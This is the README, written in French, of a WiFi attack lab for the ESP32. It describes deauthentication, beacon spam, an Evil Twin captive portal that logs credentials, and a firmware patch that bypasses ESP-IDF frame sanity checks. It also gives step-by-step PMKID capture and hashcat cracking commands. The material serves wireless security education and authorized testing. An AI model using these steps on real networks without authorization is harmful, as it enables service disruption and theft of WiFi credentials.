# ESP32 WiFi Hacking Lab

> **Projet éducatif** — Outils d'analyse et de test de sécurité WiFi sur ESP32 avec MicroPython.  
> Usage réservé à vos propres réseaux ou avec autorisation écrite. Toute utilisation non autorisée est illégale.

---

## Aperçu

Ce lab transforme un **ESP32 WROOM** en station d'audit WiFi portable, contrôlée depuis une interface web moderne accessible depuis n'importe quel navigateur.

```
┌─────────────────────┐         USB          ┌──────────────────────┐
│   Kali Linux        │ ◄──────────────────► │   ESP32 WROOM        │
│   Interface Web     │    mpremote (série)  │   MicroPython v1.25  │
│   localhost:8080    │                      │   Firmware custom    │
└─────────────────────┘                      └──────────────────────┘
          │                                            │
          │                                      2.4 GHz WiFi
          │                                            │
          ▼                                            ▼
   Wireshark / hashcat                      Scan / Deauth / Sniff
   receiver.py (.pcap)                      Beacon / Evil Twin
```

---

## Matériel requis

- **Microcontrôleur** : ESP32-D0WDQ6-V3 rev3.0, Dual Core 240MHz, Wi-Fi + BT
- **Flash** : 4MB (2MB disponible pour le système de fichiers)
- **RAM** : ~164KB libre
- **Port série** : `/dev/ttyUSB0` (baudrate 115200)
- **Firmware** : MicroPython v1.25.0 — flashé via esptool
- **OS hôte** : Linux (Kali / Debian amd64)
- Câble USB-A vers micro-USB

---

## Fonctionnalités

| Module | Description | Firmware custom requis |
|---|---|---|
| **Scanner WiFi** | Scan actif des réseaux 802.11, tableau SSID/BSSID/RSSI/canal/sécurité | Non |
| **Packet Sniffer** | Mode promiscuous, capture toutes les trames 802.11 avec channel hopping | **Oui** |
| **Probe Sniffer** | Capture les probe requests des appareils à portée | **Oui** |
| **Deauth Attack** | Envoi de trames de désauthentification (broadcast ou client ciblé) | **Oui** |
| **Beacon Spam** | Génération de dizaines de faux réseaux WiFi | **Oui** |
| **Evil Twin** | Faux AP + portail captif DNS avec journalisation des credentials | Non |
| **Streaming → Kali** | Envoi des trames brutes via TCP vers `receiver.py` (.pcap live) | **Oui** |

---

## Installation rapide

### 1. Cloner le projet

```bash
git clone https://github.com/<votre-pseudo>/esp32-wifi-lab.git
cd esp32-wifi-lab
```

### 2. Créer l'environnement Python

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install mpremote esptool flask
```

### 3. Flasher MicroPython sur l'ESP32

```bash
# Vérifier le port
ls /dev/ttyUSB*   # → /dev/ttyUSB0

# Effacer et flasher MicroPython v1.25 (télécharger sur micropython.org)
python3 -m esptool --port /dev/ttyUSB0 --baud 460800 erase_flash
python3 -m esptool --port /dev/ttyUSB0 --baud 460800 \
    write_flash -z 0x1000 ESP32_GENERIC-v1.25.0.bin
```

### 4. Déployer les fichiers MicroPython

```bash
python tools/deploy.py
```

### 5. Lancer l'interface web

```bash
python tools/webui.py
# → http://localhost:8080
# → http://<ip-machine>:8080  (accessible depuis le réseau local)
```

---

## Commandes mpremote fréquentes

```bash
# Activer le venv
source .venv/bin/activate

# Ouvrir le REPL interactif
mpremote connect /dev/ttyUSB0

# Copier un fichier vers l'ESP32
mpremote connect /dev/ttyUSB0 cp fichier.py :fichier.py

# Exécuter un fichier directement
mpremote connect /dev/ttyUSB0 run fichier.py

# Lister les fichiers sur l'ESP32
mpremote connect /dev/ttyUSB0 ls
```

---

## Structure du projet

```
esp32-wifi-lab/
├── README.md
├── .gitignore
├── src/
│   ├── main.py                 # Menu interactif REPL
│   ├── config.py               # Configuration globale
│   └── lib/
│       ├── wifi_scanner.py     # Scan des réseaux WiFi
│       ├── packet_sniffer.py   # Sniffer mode promiscuous
│       ├── probe_sniffer.py    # Capture des probe requests
│       ├── deauth.py           # Trames de désauthentification
│       ├── beacon_spam.py      # Génération de faux APs
│       ├── evil_twin.py        # Evil Twin + portail captif
│       ├── streaming.py        # Streaming TCP vers Kali
│       ├── packet_builder.py   # Construction trames 802.11 brutes
│       └── display.py          # Affichage terminal coloré
├── tools/
│   ├── webui.py                # Interface web Flask (port 8080)
│   ├── deploy.py               # Déploiement fichiers vers ESP32
│   ├── receiver.py             # Receiver TCP → .pcap + crack auto
│   ├── build_firmware.sh       # Build firmware custom via Docker
│   ├── patch_modesp.py         # Patch source C MicroPython
│   ├── patch_deauth_bypass.py  # Patch binaire post-build
│   └── templates/
│       └── index.html          # Interface web (Bootstrap 5 dark)
├── docs/
│   ├── usage.md                # Guide d'utilisation complet
│   └── 802.11_frames.md        # Référence trames 802.11
└── firmware/                   # Binaires compilés (ignorés par git)
```

---

## Firmware custom (injection + promiscuous)

Le firmware officiel MicroPython ne supporte pas l'injection de paquets ni le mode promiscuous.  
Ce projet inclut un système de build automatisé via **Docker + ESP-IDF v5.2**.

```bash
# Prérequis : Docker installé
sudo apt install docker.io
sudo systemctl start docker

# Build + flash automatique (10-30 min à la première exécution)
bash tools/build_firmware.sh
```

Le script effectue automatiquement :
1. Clone MicroPython v1.25.0
2. Patch `modesp.c` pour exposer `esp.wifi_set_promiscuous()`, `esp.wifi_get_pkt()`, `esp.wifi_send_pkt_freedom()`
3. Compile avec ESP-IDF v5.2 via Docker
4. Patche le binaire pour bypasser `ieee80211_raw_frame_sanity_check` (restriction ESP-IDF v5 sur les trames Deauth/Auth/Disassoc)
5. Recalcule le SHA256 de l'image app
6. Propose le flash automatique

### Modules MicroPython exposés par le firmware custom

| Module | Usage |
|---|---|
| `network` | Gestion des interfaces WiFi (STA / AP) |
| `socket` | Sockets réseau bas niveau |
| `struct` | Encodage/décodage de trames binaires |
| `ubinascii` | Conversion hex / base64 |
| `utime` | Timers et délais |
| `machine` | GPIO, UART, reset |
| `esp.wifi_set_promiscuous` | Active/désactive le mode promiscuous |
| `esp.wifi_get_pkt` | Lit le prochain paquet capturé |
| `esp.wifi_send_pkt_freedom` | Injecte une trame 802.11 brute |

---

## Interface Web

Accessible sur `http://localhost:8080` (ou `http://<ip>:8080` depuis le réseau local).

- **Scanner** — tableau des réseaux, clic pour auto-remplir les autres onglets
- **Deauth** — broadcast ou client ciblé, nombre de trames configurable
- **Beacon Spam** — mode aléatoire, opérateurs français, ou clone d'un SSID
- **Sniffer** — capture temps réel avec streaming SSE, statistiques par type de trame
- **Evil Twin** — démarrage/arrêt asynchrone, portail captif, visualisation des credentials
- **Manuel** — documentation complète intégrée

---

## Workflow WPA2 — Capture + Crack

```bash
# 1. Installer hcxtools
sudo apt install hcxtools

# 2. Activer mode monitor
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 3. Capturer le PMKID (quelques secondes)
sudo hcxdumptool -i wlan0 -c 6a \
    -w captures/pmkid.pcapng --rds=2 -t 60

# 4. Extraire le hash
hcxpcapngtool -o captures/hash.hc22000 captures/pmkid.pcapng

# 5. Crack avec hashcat
hashcat -m 22000 captures/hash.hc22000 /usr/share/wordlists/rockyou.txt
```

---

## Conventions de code

- **Style** : PEP 8 adapté MicroPython (pas de type hints, pas de dataclasses)
- **Modules** : chaque fonctionnalité dans son propre fichier dans `src/lib/`
- **Pas de dépendances externes** sauf ce qui est inclus dans MicroPython
- **Commentaires** : uniquement quand le *pourquoi* n'est pas évident

---

## Dépendances

| Outil | Usage | Installation |
|---|---|---|
| `mpremote` | Communication ESP32 via série | `pip install mpremote` |
| `esptool` | Flash firmware | `pip install esptool` |
| `flask` | Serveur interface web | `pip install flask` |
| `docker` | Build firmware custom | `sudo apt install docker.io` |
| `aircrack-ng` | Suite WiFi audit | `sudo apt install aircrack-ng` |
| `hcxtools` | Capture PMKID / conversion hash | `sudo apt install hcxtools` |
| `hashcat` | Crack WPA2 | `sudo apt install hashcat` |
| `wireshark` | Analyse captures .pcap | `sudo apt install wireshark` |

---

## Avertissement légal

Ce projet est développé à des fins **strictement éducatives et défensives**.

- Scan passif et actif des réseaux WiFi environnants
- Analyse des trames 802.11 (beacon, probe, auth, deauth)
- Génération de paquets personnalisés (raw socket / promiscuous mode)
- Simulation d'attaques connues en environnement isolé

L'utilisation de ces outils sur des réseaux sans autorisation explicite est **illégale** dans la plupart des pays.  
L'auteur décline toute responsabilité en cas d'usage malveillant.

**Toute utilisation est réservée à un réseau personnel ou un lab isolé.**

---

## Licence

MIT License
